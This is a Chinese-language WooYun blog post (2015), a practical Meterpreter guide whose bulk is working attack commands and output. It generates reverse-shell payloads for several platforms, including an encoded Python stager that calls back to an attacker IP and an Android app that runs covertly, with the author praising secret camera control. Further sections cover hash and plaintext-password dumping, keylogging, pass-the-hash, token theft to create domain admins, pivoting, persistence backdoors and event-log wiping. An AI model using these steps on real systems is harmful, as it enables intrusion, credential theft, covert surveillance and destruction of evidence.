@@ -1,0 +1,388 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Meterpreter Guide</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Croxy</a> <span class="bull">·</span> <time title="2015/11/04 16:10" ui-time="" datetime="2015/11/04 16:10" class="published ng-binding ng-isolate-scope">2015/11/04 16:10</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>由于网上很多文章乱而不全或者过期了 所以打算噜这篇来做个笔记～ 方便自己以后查阅:)</p><h1>0x01 入门篇(生成与接收)</h1><hr><h2>功能介绍</h2><p>msfpayload和msfencode已经被时代淘汰了现在都转为msfvenom了</p><pre><code>msfvenom命令行选项如下：
+    Options:
+        -p, --payload    payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用'-'或者stdin指定
+        -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
+        -n, --nopsled    length&gt;        为payload预先指定一个NOP滑动长度
+        -f, --format     format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+     -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+        -a, --arch       architecture&gt;  指定payload的目标架构
+            --platform   platform&gt;      指定payload的目标平台
+        -s, --space      length&gt;        设定有效攻击荷载的最大长度
+        -b, --bad-chars  list&gt;          设定规避字符集，比如: '\x00\xff'
+        -i, --iterations count&gt;         指定payload的编码次数
+        -c, --add-code   path&gt;          指定一个附加的win32 shellcode文件
+        -x, --template   path&gt;          指定一个自定义的可执行文件作为模板
+        -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+            --payload-options            列举payload的标准选项
+        -o, --out   path&gt;               保存payload
+        -v, --var-name name&gt;            指定一个自定义的变量，以确定输出格式
+        --shellest                   最小化生成payload
+        -h, --help                       查看帮助选项
+        --help-formats               查看msf支持的输出格式列表
+</code></pre><h3>查看一个Payload具体需要什么参数</h3><pre><code>msfvenom -p windows/meterpreter/bind_tcp --payload-options
+
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
+LPORT     4444             yes       The listen port
+RHOST                      no        The target address
+</code></pre><p>只示范reverse_tcp 大家可以根据各种不同的环境来选择Payload</p><p><strong><code>reverse_http</code> or <code>bind_tcp</code> ...</strong></p><p>自己本地生成的bind_tcp的payload并不能在Windows机子上运行 (提示不是可用的Win32程序:(....)</p><p>如果大家也有遇到这种错误的话 推荐用msfvenom生成c的shellcode 然后自己编译为exe后运行:)</p><p>说不定还有以外的效果哦～</p><p>分享一个bind_tcp的栗子 (自行更改shelcode)</p><pre><code>#include "windows.h"
+#include "stdio.h"
+
+typedef void (_stdcall *CODE)();    
+
+unsigned char shellcode[] = 
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
+"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
+"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
+"\x50\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
+"\xff\xd5\x97\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
+"\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
+"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
+"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01"
+"\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff"
+"\xd5";
+
+void RunShellCode()  
+{  
+    ( (void (*)(void))&amp;shellcode )();  
+}  
+
+
+void main()  
+{  
+    RunShellCode();  
+}
+</code></pre><p><strong>具体编码方式和编码次数大家可以自行改变:)</strong></p><p><strong>使用msfvenom --list可以查看所有的payload encoder nops...哦～～</strong></p><h3>生成Windows reverse_tcp payload</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe
+</code></pre><p>or</p><pre><code>msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe
+</code></pre><h3>生成Python reverse_tcp payload</h3><pre><code>msfvenom -p python/meterpreter/reverse_tcp -e -i 3 LHOST=172.22.25.51  LPORT=23333
+</code></pre><p>生成出来的Python是可以直接解码来改IP的端口的 所以可以不用浪费时间生成payload 大家自行更改IP和端口～</p><pre><code>import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxNzIuMjIuMjUuNTEnLDIzMzMzKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))
+</code></pre><h3>生成java payload</h3><pre><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/123.jar
+</code></pre><h3>生成php payload</h3><pre><code>msfvenom -p  php/meterpreter_reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/123.php
+</code></pre><h3>生成Linux payload</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -f elf -o ~/Desktop/123.elf
+</code></pre><h3>生成Android的payload :)</h3><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/1234.apk
+</code></pre><p>生成后 手机点击app无任何反应 app就默默的后台运行 干啥都行:) so cool!偷偷控制手机摄像头！</p><p><img alt="" img-src="d7255db507a06d99bb0d6f2b09298e4f75cd5101.jpg"></p><h2>接收</h2><pre><code>msf &gt; use multi/handler
+msf exploit(handler) &gt; set payload android/meterpreter/reverse_tcp
+payload =&gt; android/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LPORT 23333
+LPORT =&gt; 23333
+msf exploit(handler) &gt; set LHOST 10.42.0.1
+LHOST =&gt; 10.42.0.1
+msf exploit(handler) &gt; exploit
+</code></pre><h1>0x02 Go on:)</h1><hr><h2>基本命令：</h2><pre><code>background  # 让meterpreter处于后台模式  
+sessions -i number   # 与会话进行交互，number表示第n个session  
+quit  # 退出会话  
+shell # 获得命令行
+cat c:\\boot.ini   # 查看文件内容  
+getwd # 查看当前工作目录 work directory  
+upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机上  
+download 0xfa.txt /root/Desktop/   # 下载文件到本机上  
+edit c:\\boot.ini  # 编辑文件  
+search -d d:\\www -f web.config # search 文件 
+ps # 查看当前活跃进程  
+migrate  pid # 将Meterpreter会话移植到进程数位pid的进程中  
+execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互  
+getpid # 获取当前进程的pid  
+kill pid # 杀死进程  
+getuid # 查看权限  
+sysinfo # 查看目标机系统信息，如机器名，操作系统等  
+getsystem #提权操作
+timestompc:/a.doc -c "10/27/2015 14:22:11" #修改文件的创建时间
+</code></pre><h3>迁移进程</h3><pre><code>meterpreter &gt; ps
+</code></pre><p>自行选择PID</p><pre><code>meterpreter &gt; migrate pid
+</code></pre><h3>提权操作</h3><ul><li><p>getsystem 大部分都会失败 他只尝试了4个Payload。</p><pre><code>meterpreter &gt; getuid    
+Server username: Testing\Croxy    
+meterpreter &gt; getsystem    
+[-] priv_elevate_getsystem: Operation failed: Access is denied.    
+</code></pre></li><li><p>使用MS14-058之类的Exp进行提权</p><pre><code>meterpreter &gt; background
+[*] Backgrounding session 3..
+msf exploit(handler) &gt; use exploit/windows/local/ms14_058_track_popup_menu
+msf exploit(ms14_058_track_popup_menu) &gt; set SESSION 3
+</code></pre><p><img alt="" img-src="16a26fbbfb5f9cfe05d81f5a0eb4828add065083.jpg"></p><p>再也不用去网上找Exp来下载拉～：）</p></li></ul><h3>获取敏感信息（Windows版本 Linux自行选择）</h3><pre><code>run post/windows/gather/checkvm #是否虚拟机
+run post/windows/gather/enum_applications #获取安装软件信息
+run post/windows/gather/dumplinks   #获取最近的文件操作
+run post/windows/gather/enum_ie  #获取IE缓存
+run post/windows/gather/enum_chrome   #获取Chrome缓存
+run scraper                      #获取常见信息
+#保存在～/.msf4/logs/scripts/scraper/目录下
+</code></pre><p>详细请参考 <a href="http://drops.wooyun.org/tips/9732">http://drops.wooyun.org/tips/9732</a></p><h3>键盘记录</h3><pre><code>meterpreter &gt; keyscan_start
+Starting the keystroke sniffer...
+meterpreter &gt; keyscan_dump
+Dumping captured keystrokes...
+dir &lt;Return&gt; cd  &lt;Ctrl&gt;  &lt;LCtrl&gt;
+meterpreter &gt; keyscan_stop
+Stopping the keystroke sniffer...
+</code></pre><h3>网络嗅探</h3><pre><code>meterpreter &gt; use sniffer
+Loading extension sniffer...success.
+meterpreter &gt; sniffer_interfaces
+    1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
+    2 - 'Intel(R) PRO/1000 MT Desktop Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
+    3 - 'Cisco Systems VPN Adapter' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
+meterpreter &gt; sniffer_start 2
+[*] Capture started on interface 2 (50000 packet buffer)
+meterpreter &gt; sniffer_dump 2 /tmp/test2.cap
+[*] Flushing packet capture buffer for interface 2...
+[*] Flushed 1176 packets (443692 bytes)
+[*] Downloaded 100% (443692/443692)...
+[*] Download completed, converting to PCAP...
+[*] PCAP file written to /tmp/test2.cap
+</code></pre><h3>获取Hash</h3><pre><code>meterpreter &gt; run post/windows/gather/smart_hashdump
+[*] Running module against TESTING
+[*] Hashes will be saved to the database if one is connected.
+[*] Hashes will be saved in loot in JtR password file format to:
+[*] /home/croxy/.msf4/loot/20150929225044_default_10.0.2.15_windows.hashes_407551.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*]     Obtaining the boot key...
+[*]     Calculating the hboot key using SYSKEY 8c2c8d96e92a8ccfc407a1ca48531239...
+[*]     Obtaining the user list and keys...
+[*]     Decrypting user keys...
+[*]     Dumping password hints...
+[+]     Croxy:"Whoareyou"
+[*]     Dumping password hashes...
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
+[+]     HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3f0347f8b369cac49e62a18e34834c0:::
+[+]     test123:1003:aad3b435b51404eeaad3b435b51404ee:0687211d2894295829686a18ae83c56d:::
+</code></pre><h3>获取明文密码</h3><pre><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM    
+
+meterpreter &gt; load mimikatz
+Loading extension mimikatz...success.
+meterpreter &gt; msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials    
+
+meterpreter &gt; kerberos
+[+] Running as SYSTEM
+[*] Retrieving kerberos credentials
+kerberos credentials
+====================    
+
+meterpreter &gt; mimikatz_command -f samdump::hashes
+Ordinateur : Testing
+BootKey    : 8c2c8d96e92a8ccfc407a1ca48531239    
+
+meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
+[0] { Croxy ; Testing ; hehe }
+[1] { test ; Testing ; test }
+</code></pre><h3>通过Hash获取权限</h3><pre><code>msf &gt; use exploit/windows/smb/psexec
+msf exploit(psexec) &gt; show options    
+
+Module options (exploit/windows/smb/psexec):    
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+RHOST                       yes       The target address
+RPORT      445              yes       Set the SMB service port
+SHARE      ADMIN$           yes       The share to connect to, can be an admi                                              n share
+
+(ADMIN$,C$,...) or a normal read/write folder share
+SMBDomain  WORKGROUP        no        The Windows domain to use for authentic                                                ation
+SMBPass                     no        The password for the specified username
+SMBUser                     no        The username to authenticate as    
+
+Exploit target:    
+
+Id  Name
+--  ----
+0   Automatic    
+
+msf exploit(psexec) &gt; set RHOST 192.168.0.254
+RHOST =&gt; 192.168.0.254
+msf exploit(psexec) &gt; set SMBUser isosky
+SMBUser =&gt; isosky
+msf exploit(psexec) &gt; set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537    
+
+SMBPass =&gt; 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
+msf exploit(psexec) &gt; exploit
+[*] Started reverse handler on 192.168.0.3:4444
+[*] Connecting to the server...
+[*] Authenticating to 192.168.0.254:445|WORKGROUP as user 'isosky'...
+[*] Uploading payload...
+[*] Created \UGdecsam.exe...
+[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="784a564838161b191b16">[email&#160;protected]</a>_np:192.168.0.254[\svcctl] ...
+[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ad9f839dedc3cecccec3">[email&#160;protected]</a>_np:192.168.0.254[\svcctl] ...
+[*] Obtaining a service manager handle...
+[*] Creating a new service (MZsCnzjn - "MrZdoQwIlbBIYZQJyumxYX")...
+[*] Closing service handle...
+[*] Opening service...
+[*] Starting the service...
+[*] Removing the service...
+[*] Closing service handle...
+[*] Deleting \UGdecsam.exe...
+[*] Sending stage (749056 bytes) to 192.168.0.254
+[*] Meterpreter session 1 opened (192.168.0.3:4444 -&gt; 192.168.0.254:1877) at 2011-07-19 03:57:17 +0800
+</code></pre><h1>0x03 内网渗透</h1><hr><p><strong>10.42.0.54为target</strong></p><h2>端口转发</h2><pre><code>meterpreter &gt; portfwd add -l 1234 -p 3389 -r 10.42.0.54
+[*] Local TCP relay created: 0.0.0.0:8081 &lt;-&gt; 10.42.0.54:80
+</code></pre><p>将远程主机3389端口转发到本地1234端口上</p><h2>内网代理</h2><h3>Windows</h3><pre><code>meterpreter &gt; run autoroute -s 10.42.0`.54
+[*] Adding a route to 10.42.0.54/255.255.255.0...
+[+] Added route to 10.42.0.54/255.255.255.0 via 10.42.0.54
+[*] Use the -p option to list all active routes
+meterpreter &gt; background
+[*] Backgrounding session 1...
+msf exploit(handler) &gt; use auxiliary/server/socks4a
+msf auxiliary(socks4a) &gt; show options    
+
+Module options (auxiliary/server/socks4a):
+Name     Current Setting  Required  Description
+----     ---------------  --------  -----------
+SRVHOST  0.0.0.0          yes       The address to listen on
+SRVPORT  1080             yes       The port to listen on.    
+
+Auxiliary action:
+Name   Description
+----   -----------
+Proxy      
+
+msf auxiliary(socks4a) &gt; route print
+Active Routing Table
+====================
+Subnet             Netmask            Gateway
+------             -------            -------
+10.42.0.54         255.255.255.0      Session 1    
+
+msf auxiliary(socks4a) &gt; ifconfig
+[*] exec: ifconfig    
+
+msf auxiliary(socks4a) &gt; set SRVHOST xxx.xxx.xx.xx
+SRVHOST =&gt; xxx.xxx.xx.xx (xxx.xxx.xx.xx为自己运行msf的vps机子)    
+
+msf auxiliary(socks4a) &gt; exploit
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+</code></pre><p>之后使用proxychains 设置socks4代理 链接vps上的1080端口 就可以访问内网了</p><h3>SSH代理</h3><pre><code>msf &gt; load meta_ssh
+msf &gt; use multi/ssh/login_password
+msf &gt; set RHOST 192.168.56.3
+RHOST =&gt; 192.168.56.3
+msf &gt; set USER test
+USER =&gt; test
+msf &gt; set PASS reverse
+PASS =&gt; reverse
+msf &gt; set PAYLOAD ssh/metassh_session
+PAYLOAD =&gt; ssh/metassh_session
+msf &gt; exploit -z
+[*] Connecting to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2145524d611018130f1017190f14170f12">[email&#160;protected]</a>:22 with password reverse
+[*] metaSSH session 1 opened (127.0.0.1 -&gt; 192.168.56.3:22) at 2011-12-28   03:51:16 +1300
+[*] Session 1 created in the background.
+msf &gt; route add 192.168.57.0 255.255.255.0 1
+</code></pre><p>之后就是愉快的内网扫描了</p><p>当然还是推荐直接用</p><pre><code>ssh -f -N -D 127.0.0.1:6666 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6317061017235253504d5151574d5b524d524d52">[email&#160;protected]</a>
+</code></pre><h3>偷取Token</h3><pre><code>meterpreter&gt;ps #查看目标机器进程，找出域控账户运行的进程ID
+meterpreter&gt;steal_token pid
+</code></pre><p>方法2</p><pre><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; load incognito
+Loading extension incognito...success.
+meterpreter &gt; list_tokens -u    
+
+Delegation Tokens Available
+========================================
+IIS APPPOOL\zyk
+NT AUTHORITY\IUSR
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+QLWEB\Administrator    
+
+Impersonation Tokens Available
+========================================
+NT AUTHORITY\ANONYMOUS LOGON    
+
+meterpreter &gt; impersonate_token QLWEB\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user QLWEB\Administrator
+meterpreter &gt; getuid
+Server username: QLWEB\Administrator
+meterpreter&gt;add_user 0xfa funny –h192.168.3.98  #在域控主机上添加账户
+meterpreter&gt;add_group_user “DomainAdmins” 0xfa –h192.168.3.98   #将账户添加至域管理员组
+</code></pre><p>如果有了域控:) nidongde</p><h3>内网扫描</h3><pre><code>meterpreter &gt; run autoroute -s 192.168.3.98
+meterpreter &gt; background
+[*] Backgrounding session 2...
+msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp) &gt; set PORTS 80,8080,21,22,3389,445,1433,3306
+PORTS =&gt; 80,8080,21,22,3389,445,1433,3306
+msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24
+RHOSTS =&gt; 192.168.3.1/24
+msf auxiliary(tcp) &gt; set THERADS 10
+THERADS =&gt; 10
+msf auxiliary(tcp) &gt; exploit
+</code></pre><p><img alt="" img-src="0bb4eb7cf225fdebbf0a42610511e793ac903099.jpg"></p><p>我还是推荐开代理用Nmap扫描>.&lt;</p><p>一些常用的破解模块</p><pre><code>auxiliary/scanner/mssql/mssql_login
+auxiliary/scanner/ftp/ftp_login
+auxiliary/scanner/ssh/ssh_login
+auxiliary/scanner/telnet/telnet_login
+auxiliary/scanner/smb/smb_login
+auxiliary/scanner/mssql/mssql_login
+auxiliary/scanner/mysql/mysql_login
+auxiliary/scanner/oracle/oracle_login
+auxiliary/scanner/postgres/postgres_login
+auxiliary/scanner/vnc/vnc_login
+auxiliary/scanner/pcanywhere/pcanywhere_login
+auxiliary/scanner/snmp/snmp_login
+auxiliary/scanner/ftp/anonymous
+</code></pre><p><img alt="" img-src="64657f444dd24e844a0dc44b1da73ebe4114c122.jpg"></p><p>一些好用的模块</p><pre><code>auxiliary/admin/realvnc_41_bypass  (Bypass VNCV4网上也有利用工具)
+auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁5.2版 洞略老）
+auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)）
+auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink 命令执行:)
+auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令 没回显:(）
+auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友)
+auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:)
+auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行）
+auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句)
+</code></pre><p>还一些。。。。你懂的脚本 ：）</p><pre><code>auxiliary/scanner/rsync/modules_list  （Rsync）
+auxiliary/scanner/misc/redis_server  (Redis)
+auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血)
+auxiliary/scanner/mongodb/mongodb_login (Mongodb)
+auxiliary/scanner/elasticsearch/indices_enum (elasticsearch)
+auxiliary/scanner/http/axis_local_file_include (axis本地文件包含)
+auxiliary/scanner/http/http_put (http Put)
+auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户)
+auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户)
+auxiliary/scanner/http/svn_scanner （svn Hunter :)）
+auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破)
+auxiliary/scanner/http/zabbix_login （Zabbix :)）
+</code></pre><h1>0x04 AfterWards?</h1><hr><h3>后门:)</h3><pre><code>一个vbs后门 写入了开机启动项 但是容易被发现 还是需要大家发挥自己的智慧:)    
+
+meterpreter &gt; run persistence -X -i 5 -p 23333 -r 10.42.0.1
+[*] Running Persistance Script
+[*] Resource file for cleanup created at /home/croxy/.msf4/logs/persistence/TESTING_20150930.3914/TESTING_20150930.3914.rc
+[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333
+[*] Persistent agent script is 148453 bytes long
+[+] Persistent Script written to C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs
+[*] Executing script C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs
+[+] Agent executed with PID 4140
+[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr
+[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr
+</code></pre><p>Meterpreter服务后门</p><pre><code>meterpreter &gt; run metsvc
+[*] Creating a meterpreter service on port 31337
+[*] Creating a temporary installation directory C:\Users\Croxy\AppData\Local\Temp\tuIKWqmuO...
+[*]  &gt;&gt; Uploading metsrv.x86.dll...
+[*]  &gt;&gt; Uploading metsvc-server.exe...
+[*]  &gt;&gt; Uploading metsvc.exe...
+[*] Starting the service...
+* Installing service metsvc
+* Starting service
+* Service metsvc successfully installed.
+</code></pre><p>之后电脑就默默生成了一个自启服务Meterpreter</p><p>然后连接后门</p><pre><code>msf exploit(handler) &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/metsvc_bind_tcp
+payload =&gt; windows/metsvc_bind_tcp
+msf exploit(handler) &gt; set RHOST 10.42.0.54
+RHOST =&gt; 10.42.0.54
+msf exploit(handler) &gt; set LPORT 31337
+LPORT =&gt; 31337
+msf exploit(handler) &gt; exploit
+</code></pre><h4>清理痕迹:)</h4><pre><code>meterpreter &gt; clearev
+[*] Wiping 12348 records from Application...
+[*] Wiping 1345 records from System...
+[*] Wiping 3 records from Security...
+</code></pre><h1>0x05 And So On...</h1><hr><p>Look it</p><p><a href="http://www.c-chicken.cc/msf.txt">Tree</a></p><p>Meterpreter太强大～</p><p>待续补充完整：）</p><p>不足请见谅:)</p><p>Thanks:</p><ul><li><a href="http://drops.wooyun.org/tips/24">http://drops.wooyun.org/tips/24</a></li><li><a href="http://drops.wooyun.org/tips/5234">http://drops.wooyun.org/tips/5234</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/24" rel="bookmark" id="re1">使用Hash直接登录Windows</a></li><li><a href="http://drops.wooyun.org/tips/2746" rel="bookmark" id="re2">metasploit渗透测试笔记(内网渗透篇)</a></li><li><a href="http://drops.wooyun.org/tips/8971" rel="bookmark" id="re3">通过DNS TXT记录执行powershell</a></li><li><a href="http://drops.wooyun.org/tips/3353" rel="bookmark" id="re4">Powershell tricks::Bypass AV</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Blood_Zero</span> <span class="reply-time">2015-11-12 17:20:00</span></div><p></p><p>好文，值得一看！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c4bbage</span> <span class="reply-time">2015-11-07 13:44:40</span></div><p></p><p>AHOST</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hear7v</span> <span class="reply-time">2015-11-06 23:09:59</span></div><p></p><p>据说后面的截图是某个大商的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">默之</span> <span class="reply-time">2015-11-06 10:27:06</span></div><p></p><p>写的好多，赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mtfly</span> <span class="reply-time">2015-11-04 20:00:09</span></div><p></p><p>很不错，感谢。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c-chicken</span> <span class="reply-time">2015-11-04 17:33:14</span></div><p></p><p>据说后面的截图是某个大商的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Purpleroc</span> <span class="reply-time">2015-11-04 17:19:54</span></div><p></p><p>据说后面的截图是某个大商的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2015-11-04 17:09:57</span></div><p></p><p>据说后面的截图是某个大商的</p><p></p></div></div></div></div></div></main>
